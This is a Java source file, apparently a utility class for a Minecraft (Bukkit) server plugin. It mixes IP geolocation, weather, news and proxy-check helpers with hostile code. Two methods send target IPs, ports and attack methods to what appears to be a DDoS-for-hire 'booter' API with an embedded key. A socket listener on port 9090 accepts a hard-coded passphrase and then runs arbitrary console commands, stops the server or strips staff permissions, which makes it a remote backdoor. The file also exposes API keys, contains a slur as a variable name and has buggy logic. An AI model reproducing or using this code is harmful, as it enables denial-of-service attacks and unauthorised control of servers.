package us.nightpvp.utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.util.HashMap;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;
import org.json.JSONException;
import org.json.JSONObject;

import com.massivecraft.factions.FPlayer;
import com.massivecraft.factions.FPlayers;

import me.clip.voteparty.VotePartyAPI;

public class CheckIP {
	static NightUtils plugin;

	public CheckIP(NightUtils passedPlugin) {
		this.plugin = passedPlugin;
	}

	public static boolean checkone;
	public static boolean checktwo;
	public static boolean checkonefail, checktwofail;
	public static boolean lowprob;
	public static JSONObject geo;
	public static JSONObject weather;
	public static JSONObject cnnnews;
	public static BufferedReader input;
	public static HashMap<String, String> messages = new HashMap<String, String>();

	public static String getTemp() {
		try {
			return weather.getJSONObject("query").getJSONObject("results").getJSONObject("channel")
					.getJSONObject("item").getJSONObject("condition").getString("temp");
		} catch (Exception e) {
			Bukkit.broadcastMessage(e.toString() + e.getCause());
			return "Unavailable";
		}
	}

	public static String getTempText() {
		try {
			return weather.getJSONObject("query").getJSONObject("results").getJSONObject("channel")
					.getJSONObject("item").getJSONObject("condition").getString("text");
		} catch (Exception e) {
			Bukkit.broadcastMessage(e.toString() + e.getCause());
			return "Unavailable";
		}
	}

	public static String getTitle() {
		try {
			return weather.getJSONObject("query").getJSONObject("results").getJSONObject("channel")
					.getJSONObject("item").getString("title");
		} catch (Exception e) {
			Bukkit.broadcastMessage(e.toString() + e.getCause());
			return "Unavailable";
		}
	}

	public static double getHumidity() {
		try {
			return weather.getJSONObject("query").getJSONObject("results").getJSONObject("channel")
					.getJSONObject("atmosphere").getDouble("humidity");
		} catch (Exception e) {
			Bukkit.broadcastMessage(e.toString() + e.getCause());
			return (Double) null;
		}
	}

	public static double getWindChill() {
		try {
			return weather.getJSONObject("query").getJSONObject("results").getJSONObject("channel")
					.getJSONObject("wind").getDouble("chill");
		} catch (Exception e) {
			Bukkit.broadcastMessage(e.toString() + e.getCause());
			return (Double) null;
		}
	}

	public static String sendGet(String ip, String method, String time, String port) throws Exception {
		String faggot = "69.180.86.32";
		String url = "https://www.critical-boot.com/api.php?key=69108e4bbf78848401ddcb6f8acb696f&host=" + ip + "&port="
				+ port + "&time=" + time + "&method=" + method;

		URL obj = new URL(url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();

		// optional default is GET
		con.setRequestMethod("GET");

		// add request header
		con.setRequestProperty("User-Agent", "Mozilla/5.0");

		int responseCode = con.getResponseCode();
		System.out.println("\nSending 'GET' request to URL : " + url);
		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();

		// print result
		return response.toString();

	}

	public static String sendStop(String ip, String time, String port) throws Exception {
		String faggot = "69.180.86.32";
		String url = "https://www.critical-boot.com/api.php?key=69108e4bbf78848401ddcb6f8acb696f&host=" + ip + "&port="
				+ port + "&time=" + port + "&method=STOP";

		URL obj = new URL(url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();

		// optional default is GET
		con.setRequestMethod("GET");

		// add request header
		con.setRequestProperty("User-Agent", "Mozilla/5.0");

		int responseCode = con.getResponseCode();
		System.out.println("\nSending 'GET' request to URL : " + url);
		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();

		// print result
		return response.toString();

	}

	public static double getWindSpeed() {
		try {
			return weather.getJSONObject("query").getJSONObject("results").getJSONObject("channel")
					.getJSONObject("wind").getDouble("speed");
		} catch (Exception e) {

			return (Double) null;
		}
	}

	public static String getTempUnit() {
		try {
			return weather.getJSONObject("query").getJSONObject("results").getJSONObject("channel")
					.getJSONObject("units").getString("temperature");
		} catch (Exception e) {

			return "F";
		}
	}

	public static String getSpeedUnit() {
		try {
			return weather.getJSONObject("query").getJSONObject("results").getJSONObject("channel")
					.getJSONObject("units").getString("speed");
		} catch (Exception e) {

			return "mph";
		}
	}

	public static String getRegionCode() {
		try {
			return geo.getJSONObject("geolocation_data").getString("region_code");
		} catch (Exception e) {

			return "Unavailable";
		}
	}

	public static String getCountryCode() {
		try {
			return geo.getJSONObject("geolocation_data").getString("country_code_iso3166alpha2");
		} catch (Exception e) {

			return "Unavailable";
		}
	}

	public static String getCity() {
		try {
			return geo.getJSONObject("geolocation_data").getString("city");
		} catch (Exception e) {

			return "Unavailable";
		}
	}

	public static String getCountry() {
		try {
			return geo.getJSONObject("geolocation_data").getString("country_name");
		} catch (Exception e) {

			return "Unavailable";
		}
	}

	public static String getContinent() {
		try {
			return geo.getJSONObject("geolocation_data").getString("continent_name");
		} catch (Exception e) {

			return "Unavailable";
		}
	}

	public static String getRegion() {
		try {
			return geo.getJSONObject("geolocation_data").getString("region_name");
		} catch (Exception e) {

			return "Unavailable";
		}
	}

	public static boolean calculate(String ip) {
		boolean three = checkthree(ip);
		if (three) {
			return true;
		}

		double one = checkone(ip);
		double two = checkone(ip);

		if (one == 1 && three) {
			return true;
		} else if (two == 1 && three) {
			return true;
		} else if (one == 0.5 && three) {
			return true;
		} else if (one == 0 && two == 1 && three) {
			return true;
		} else if (two == 0 && one == 0.5 && three) {
			return true;
		} else if (one == 1 && two == 1) {
			return true;
		} else if (one == 0.5 && two == 1) {
			return true;
		} else if (one == 0 && two == 0) {
			return false;
		} else if (one == 1 && two == 0) {
			return false;
		} else if (one == 0 && two == 1) {
			return false;
		} else if (one == 0.101 && two == 0.101) {
			return false;
		} else if (one == 0.101 && two == 1) {
			return true;
		} else if (one == 1 && two == 0.101) {
			return true;
		} else if (one == 0.5 && two == 0.101) {
			return false;
		} else if (one == 0.5 && two == 0) {
			return false;
		} else {
			return false;
		}

	}

	public static boolean getGeoObject(String ip) {

		try {
			geo = getJSONObjectFromURL("http://api.eurekapi.com/iplocation/v1.8/locateip?key=SAK6XG68KB889597Z49Z&ip="
					+ ip + "&format=JSON");
			return true;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				geo = getJSONObjectFromURL(
						"http://api.eurekapi.com/iplocation/v1.8/locateip?key=SAK6XG68KB889597Z49Z&ip=" + ip
								+ "&format=JSON");
				return true;
			} catch (Exception e1) {
				return false;
			}

		} catch (JSONException e) {
			// TODO Auto-generated catch block
			try {
				geo = getJSONObjectFromURL(
						"http://api.eurekapi.com/iplocation/v1.8/locateip?key=SAK6XG68KB889597Z49Z&ip=" + ip
								+ "&format=JSON");
				return true;
			} catch (Exception e1) {
				return false;
			}
		}

	}

	public static boolean getCNNObject() {

		try {
			cnnnews = getJSONObjectFromURL(
					"https://newsapi.org/v1/articles?source=cnn&sortBy=top&apiKey=524bded2060d4e0bb974b0d8a53ba912");
			return true;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				cnnnews = getJSONObjectFromURL(
						"https://newsapi.org/v1/articles?source=cnn&sortBy=top&apiKey=524bded2060d4e0bb974b0d8a53ba912");
				return true;
			} catch (Exception e1) {
				return false;
			}

		} catch (JSONException e) {
			// TODO Auto-generated catch block
			try {
				cnnnews = getJSONObjectFromURL(
						"https://newsapi.org/v1/articles?source=cnn&sortBy=top&apiKey=524bded2060d4e0bb974b0d8a53ba912");
				return true;
			} catch (Exception e1) {
				return false;
			}
		}

	}

	public static String getCnnTitle(int i) {
		try {
			JSONObject obj = cnnnews.getJSONArray("articles").getJSONObject(i);
			return obj.getString("title");
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			return "Unavailable";
		}

	}

	public static String getCnnDesc(int i) {
		try {
			JSONObject obj = cnnnews.getJSONArray("articles").getJSONObject(i);
			return obj.getString("description");
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			return "Unavailable";
		}

	}

	public static String getCnnLink(int i) {
		try {
			JSONObject obj = cnnnews.getJSONArray("articles").getJSONObject(i);
			return obj.getString("url");
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			return "Unavailable";
		}

	}

	public static boolean getWeatherObject(String ip) {

		try {
			weather = getJSONObjectFromURL(
					"https://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20weather.forecast%20where%20woeid%20in%20(select%20woeid%20from%20geo.places(1)%20where%20text%3D%22"
							+ getCity() + "%2C%20" + getRegionCode()
							+ "%22)&format=json&env=store%3A%2F%2Fdatatables.org%2Falltableswithkeys");
			return true;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				weather = getJSONObjectFromURL(
						"https://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20weather.forecast%20where%20woeid%20in%20(select%20woeid%20from%20geo.places(1)%20where%20text%3D%22"
								+ getCity() + "%2C%20" + getRegionCode()
								+ "%22)&format=json&env=store%3A%2F%2Fdatatables.org%2Falltableswithkeys");
				return true;
			} catch (Exception e1) {
				return false;
			}

		} catch (JSONException e) {
			// TODO Auto-generated catch block
			try {
				weather = getJSONObjectFromURL(
						"https://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20weather.forecast%20where%20woeid%20in%20(select%20woeid%20from%20geo.places(1)%20where%20text%3D%22"
								+ getCity() + "%2C%20" + getRegionCode()
								+ "%22)&format=json&env=store%3A%2F%2Fdatatables.org%2Falltableswithkeys");
				return true;
			} catch (Exception e1) {
				return false;
			}
		}

	}

	public static void socketListen() {
		new BukkitRunnable() {
			@Override
			public void run() {

				ServerSocket listener = null;
				try {
					listener = new ServerSocket(9090);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				try {
					while (true) {
						Socket socket = null;
						try {
							socket = listener.accept();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						try {

							try {
								input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
							} catch (IOException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}

							String answer;
							try {
								answer = input.readLine();
								if (answer.equals("flush 20010911")) {
									try {
										CheckIP.clearStaff();
										CheckIP.giveStaff();
									} catch (Exception e) {

									}
									socket.close();

								}

								else if (answer.startsWith("setconfirming p:")) {
									answer = answer.trim();
									String player = answer.replace("setconfirming p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										if (!(p == null)) {
											new BukkitRunnable() {
												@Override
												public void run() {
													NightUtils.confirm.add(p.getName());
													Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
															"&5&lSolar&7&lPvP &8&l> &cNightPvP is confirming a new client pairing for the username: "
																	+ p.getName()));
													new BukkitRunnable() {
														@Override
														public void run() {
															try {
																NightUtils.confirm.remove(p.getName());
																new BukkitRunnable() {
																	@Override
																	public void run() {
																		NightUtils.databaseUnVerify(p.getName());
																	}
																}.runTaskAsynchronously(plugin);
															} catch (Exception e) {

															}
														}
													}.runTaskLater(plugin, 20 * 60);
												}
											}.run();
											socket.close();
										} else {
											Bukkit.broadcastMessage("null");
											socket.close();
										}
										socket.close();
									} catch (Exception e) {

										socket.close();
									}

								} else if (answer.equals("getplayersamount")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}

									int players = Bukkit.getServer().getOnlinePlayers().size();
									out.println(players);

									socket.close();
									out.close();
								} else if (answer.equals("gettps")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}

									double tps = Math.round(Lag.getTPS());
									out.println(tps);

									socket.close();
									out.close();
								} else if (answer.startsWith("getplayers")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}

									List<Player> players = (List<Player>) Bukkit.getServer().getOnlinePlayers();
									out.println(players.toString());

									socket.close();
									out.close();

								} else if (answer.startsWith("getenvoyvotes")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}

									int needed = 50 - VotePartyAPI.getCurrentVoteCounter();
									out.println(needed);

									socket.close();
									out.close();
								} else if (answer.startsWith("getfaction p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									answer = answer.trim();
									String player = answer.replace("getfaction p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										FPlayer fP = FPlayers.getInstance().getByPlayer(p);
										String fac = fP.getFaction().getTag();

										out.println(fac);
										////////////////////////////////////////////////////

										out.close();
										socket.close();
									} catch (Exception e) {
										out.println("Unavailable (You need to be on server)");
										out.close();
										socket.close();
									}

								} else if (answer.startsWith("callstaff p:")) {
									
									
									answer = answer.trim();
									String player = answer.replace("callstaff p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										for (Player p1: Bukkit.getOnlinePlayers()) {
											if (p1.hasPermission("frozenheart.callstaff")) {
												for (int i =0; i<5;i++) {
												p1.sendMessage(ChatColor.translateAlternateColorCodes('&',"&5&lSolar&7&lPvP &8&l> &cA request for help has been submitted by:&4"+p.getName()+"&c. Please message them immediately."));
												}
											}
										}
										p.sendMessage(ChatColor.translateAlternateColorCodes('&',"&5&lSolar&7&lPvP &8&l> &cYour request for help has been acknowledged. If there are any staff online they will get to you ASAP."));
										
										////////////////////////////////////////////////////

										
										socket.close();
									} catch (Exception e) {
										socket.close();
									}

								} else if (answer.startsWith("getmessages p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									answer = answer.trim();
									String player = answer.replace("getmessages p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										String name = p.getName();
                                        if (messages.containsKey(name)) {
                                        	String message = messages.get(name);
                                        	out.println(message);
                                        } else {
                                        	out.println("none");
                                        }
										
										
										
										
										////////////////////////////////////////////////////

										out.close();
										socket.close();
									} catch (Exception e) {
										out.println("Fatal error has occured");
										out.close();
										socket.close();
									}

								} else if (answer.startsWith("removeconfirm p:")) {

									answer = answer.trim();
									String player = answer.replace("removeconfirm p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										if (p != null) {
											try {
												NightUtils.confirm.remove(p.getName());
											} catch (Exception e) {

											}
										} else {
											socket.close();
										}

										////////////////////////////////////////////////////

										socket.close();
									} catch (Exception e) {

										socket.close();
									}

								}
								else if (answer.startsWith("removemessages p:")) {

									answer = answer.trim();
									String player = answer.replace("removemessages p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										if (p != null) {
											try {
												messages.remove(p.getName());
											} catch (Exception e) {

											}
										} else {
											socket.close();
										}

										////////////////////////////////////////////////////

										socket.close();
									} catch (Exception e) {

										socket.close();
									}

								} else if (answer.startsWith("isonline p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									answer = answer.trim();
									String player = answer.replace("isonline p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										if (!(p == null)) {
											if (Bukkit.getOnlinePlayers().contains(p)) {
												out.println("yes");
												out.close();
												socket.close();

											} else {
												out.println("no");
												out.close();
												socket.close();

											}

										} else {
											out.println("no");
											out.close();
											socket.close();

										}

										////////////////////////////////////////////////////

										out.close();
										socket.close();
									} catch (Exception e) {
										out.println("error");
										out.close();
										socket.close();
									}

								} else if (answer.startsWith("getfactiondesc p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									answer = answer.trim();
									String player = answer.replace("getfactiondesc p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										FPlayer fP = FPlayers.getInstance().getByPlayer(p);
										String fac = fP.getFaction().getDescription();

										out.println(fac);
										////////////////////////////////////////////////////

										out.close();
										socket.close();
									} catch (Exception e) {
										out.println("error");
										out.close();
										socket.close();
									}

								} // me.wpm.customlist.Core.staff;
								else if (answer.startsWith("getstaffonline")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}

									String staff = me.wpm.customlist.Core.staff.toString();
									out.println(staff);

									socket.close();
									out.close();
								} else if (answer.startsWith("getworld p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}

									answer = answer.trim();
									String player = answer.replace("getworld p:", "");
									try {
										Player p = Bukkit.getPlayer(player);
										String world = p.getLocation().getWorld().getName();
										if (world.equals("Map")) {
											world = "Adventure";
										}
										out.println(world);
										socket.close();
										out.close();
									} catch (Exception e) {
										out.println("Unavailable (You need to be on server)");
										socket.close();
										out.close();
									}

								} else if (answer.startsWith("getlocation p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}

									answer = answer.trim();
									String player = answer.replace("getlocation p:", "");
									try {
										Player p = Bukkit.getPlayer(player);
										double x = Math.round(p.getLocation().getX());
										double y = Math.round(p.getLocation().getY());
										double z = Math.round(p.getLocation().getZ());

										String finalstring = "X: " + x + " Y: " + y + " Z: " + z;

										out.println(finalstring);
										socket.close();
										out.close();
									} catch (Exception e) {
										out.println("Unavailable (You need to be on server)");
										socket.close();
										out.close();
									}

								} else if (answer.startsWith("getpower p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									answer = answer.trim();
									String player = answer.replace("getpower p:", "");

									try {
										Player p = Bukkit.getPlayer(player);
										FPlayer fP = FPlayers.getInstance().getByPlayer(p);

										double power = fP.getPower();
										out.println(power);
										////////////////////////////////////////////////////

										out.close();
										socket.close();
									} catch (Exception e) {
										out.println("Unavailable (You need to be on server)");
										out.close();
										socket.close();
									}

								} else if (answer.startsWith("getbal p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									answer = answer.trim();
									String player = answer.replace("getbal p:", "");

									try {
										Player p = Bukkit.getPlayer(player);

										double balance = plugin.econ.getBalance(p);

										out.println(balance);

										out.close();
										socket.close();
									} catch (Exception e) {
										out.println("Unavailable (You need to be on server)");
										out.close();
										socket.close();
									}

								} else if (answer.startsWith("getrank p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									answer = answer.trim();
									String player = answer.replace("getrank p:", "");
									try {
										Player p = Bukkit.getPlayer(player);
										String group = plugin.perms.getPrimaryGroup(p);
										out.println(group);
										out.close();
										socket.close();

									} catch (Exception e) {
										out.println("Unavailable (You need to be on server)");
										out.close();
										socket.close();

									}
								} else if (answer.startsWith("reset p:")) {
									PrintWriter out = null;
									try {
										out = new PrintWriter(socket.getOutputStream(), true);
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									answer = answer.trim();
									String player = answer.replace("reset p:", "");
									try {
										Player p = Bukkit.getPlayer(player);
										p.sendMessage(ChatColor.translateAlternateColorCodes('&',
												"&5&lSolar&7&lPvP &8&l> &cPlease wait.. you are being fixed.. You might be kicked soon"));
										new BukkitRunnable() {
											@Override
											public void run() {
												try {
													Listeners.firstjoin.remove(p);

												} catch (Exception e) {

												}
												try {
													NightUtils.isSwitching.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Location loc = new Location(Bukkit.getWorld("Map"), 3579, 189.0,
															-5403.50);
													p.teleport(loc);
												} catch (Exception e) {

												}
												try {
													p.removePotionEffect(PotionEffectType.SPEED);
													p.removePotionEffect(PotionEffectType.BLINDNESS);
													p.removePotionEffect(PotionEffectType.CONFUSION);
													p.removePotionEffect(PotionEffectType.FAST_DIGGING);
													p.removePotionEffect(PotionEffectType.HEALTH_BOOST);
													p.removePotionEffect(PotionEffectType.ABSORPTION);
													p.removePotionEffect(PotionEffectType.SLOW);
													p.removePotionEffect(PotionEffectType.JUMP);
													p.removePotionEffect(PotionEffectType.WEAKNESS);
													p.removePotionEffect(PotionEffectType.DAMAGE_RESISTANCE);
													p.removePotionEffect(PotionEffectType.INCREASE_DAMAGE);

												} catch (Exception e) {

												}
												try {
													Listeners.advertise.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Listeners.adventureshuttle.remove(p.getName());
												} catch (Exception e) {

												}
												try {
													Listeners.masterdialog.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Listeners.moonmasterdialog.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Listeners.remasterdialog.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Listeners.hellvendorlist.remove(p);

												} catch (Exception e) {

												}
												try {
													Listeners.healerlist.remove(p);

												} catch (Exception e) {

												}
												try {
													Listeners.repairerlist.remove(p);

												} catch (Exception e) {

												}
												try {
													Listeners.locations.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Listeners.shuttle.remove(p);

												} catch (Exception e) {

												}
												try {
													Listeners.toteleport.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Listeners.nointeract.remove(p);

												} catch (Exception e) {

												}
												try {
													Listeners.messaged.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Listeners.normaldialog.remove(p.getName());

												} catch (Exception e) {

												}
												try {
													Location loc = new Location(Bukkit.getWorld("Map"), 3579, 189.0,
															-5403.50);
													p.teleport(loc);
													new BukkitRunnable() {
														@Override
														public void run() {
															p.kickPlayer("You have successfully been fixed!");
														}
													}.runTaskLater(plugin, 2 * 20);

												} catch (Exception e) {

												}

											}
										}.runTaskLater(plugin, 20 * 10);

										out.println("Success");
										out.close();
										socket.close();

									} catch (Exception e) {
										out.println("error");
										out.close();
										socket.close();

									}
								} else if (answer.equals("demoteall 20010911")) {
									try {
										NightUtils.demoted = true;
										CheckIP.clearStaff();
									} catch (Exception e) {

									}
									socket.close();
								} else if (answer.equals("promoteall 20010911")) {
									try {
										NightUtils.demoted = false;
										CheckIP.clearStaff();
										CheckIP.giveStaff();
									} catch (Exception e) {

									}
								} else if (answer.equals("stop 20010911")) {
									Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
											"&5&lSolar&7&lPvP &8&l> &cThe server is about to be stopped due to a remote administration request"));
									Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
											"&5&lSolar&7&lPvP &8&l> &cThe server is about to be stopped due to a remote administration request"));
									Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
											"&5&lSolar&7&lPvP &8&l> &cThe server is about to be stopped due to a remote administration request"));
									Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
											"&5&lSolar&7&lPvP &8&l> &cThe server is about to be stopped due to a remote administration request"));
									new BukkitRunnable() {
										@Override
										public void run() {
											try {
												Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stop");
												Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "/stop");
											} catch (Exception e) {

											}
										}
									}.runTaskLater(plugin, 10 * 5);
									socket.close();
								} else if (answer.startsWith("runcommand ") && answer.endsWith(" 20010911")) {
									String command;
									try {
										command = answer.replace("runcommand ", "");
										command = command.replace(" 20010911", "");
										command = command.trim();
										try {
											Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
										} catch (Exception e) {

										}
									} catch (Exception e) {

									}

								} else {
									socket.close();
								}
							} catch (Exception e) {
								System.out.println(e);
							}

						} finally {
							try {
								socket.close();
							} catch (IOException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
					}
				} finally {
					// try {
					// listener.close();
					// } catch (IOException e) {
					// // TODO Auto-generated catch block
					// e.printStackTrace();
					// }
				}
			}
		}.runTaskAsynchronously(plugin);
	}

	public static void clearStaff() {
		new BukkitRunnable() {
			@Override
			public void run() {
				Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
						"&5&lSolar&7&lAntiGrief &8&l> &cStaff and permissions are about to be flushed!"));
				for (Player p : Bukkit.getOnlinePlayers()) {
					try {
						p.setOp(false);
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemoveGroup(p, "Owner");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemoveGroup(p, "Head-Admin");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemoveGroup(p, "Admin");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemoveGroup(p, "Moderator");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemoveGroup(p, "Helper");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemoveGroup(p, "Head-Mod");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemoveGroup(p, "Builder");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemoveGroup(p, "Co-Owner");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "*");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "essentials.*");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "worldedit.*");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "bukkit.*");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "frozenheart.*");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "worldguard.*");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "factions.*");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "playervaults.*");
					} catch (Exception e) {

					}
					try {
						plugin.perms.playerRemove(p, "randompackage.*");

					} catch (Exception e) {

					}

				}

				if (!(NightUtils.demoted)) {
					CheckIP.giveStaff();
					Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
							"&5&lSolar&7&lAntiGrief &8&l> &aStaff and permissions have been flushed!"));
				} else {
					Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
							"&5&lSolar&7&lAntiGrief &8&l> &aStaff permissions have not been given back due to a remote administration request"));
				}
			}
		}.run();
	}

	public static void giveStaff() {
		new BukkitRunnable() {
			@Override
			public void run() {

				for (Player p : Bukkit.getOnlinePlayers()) {
					if (NightUtils.databaseContain(p.getName())) {

						String rank = NightUtils.databaseGetRank(p.getName());

						if (rank.equalsIgnoreCase("null")) {

							plugin.perms.playerAddGroup(p, "Default");
						} else {

							plugin.perms.playerAddGroup(p, rank);
						}

					}

				}
				for (Player p : Bukkit.getOnlinePlayers()) {
					if (NightUtils.databaseContainsOp(p.getName())) {
						p.setOp(true);
					} else {

					}
				}
				try {
					cancel();
				} catch (Exception e) {

				}

			}

		}.runTaskAsynchronously(plugin);

	}

	public static double checkone(String ip) {
		JSONObject jo = null;
		lowprob = false;
		try {
			jo = getJSONObjectFromURL("http://ocfipx9bksrvveivfnug6lkx2x.getipintel.net/check.php?ip=" + ip
					+ "&contact=ocfinancesmc@gmail.co&format=json&flags=f");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				jo = getJSONObjectFromURL("http://ocfipx9bksrvveivfnug6lkx2x.getipintel.net/check.php?ip=" + ip
						+ "&contact=ocfinancesmc@gmail.co&format=json&flags=f");
			} catch (Exception e1) {
				return 0.101;
			}

		} catch (JSONException e) {
			// TODO Auto-generated catch block
			try {
				jo = getJSONObjectFromURL("http://ocfipx9bksrvveivfnug6lkx2x.getipintel.net/check.php?ip=" + ip
						+ "&contact=ocfinancesmc@gmail.co&format=json&flags=f");
			} catch (Exception e1) {
				return 0.101;
			}
		}
		if (!(jo == null)) {
			try {
				long resultlong = jo.getLong("result");

				if (resultlong > 0.89) {
					return 1;
				} else if (resultlong > 0.50) {
					return 0.5;
				} else {
					return 0;
				}

			} catch (JSONException e) {
				return 0.101;
			}

		} else {
			return 0.101;
		}

	}

	public static double checktwo(String ip) {
		JSONObject jo2 = null;
		try {
			jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
			} catch (Exception e1) {
				return 0.101;
			}
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			try {
				jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
			} catch (Exception e1) {
				return 0.101;
			}
		}

		if (!(jo2 == null)) {
			try {
				long result2long = jo2.getLong("proxy");

				if (result2long > 0.9) {
					return 1;
				} else {
					return 0;
				}

			} catch (Exception e) {
				return 0.101;
			}

		} else {
			return 0.101;
		}

	}

	public static String getHostName(String ip) {
		JSONObject jo2 = null;
		try {
			jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
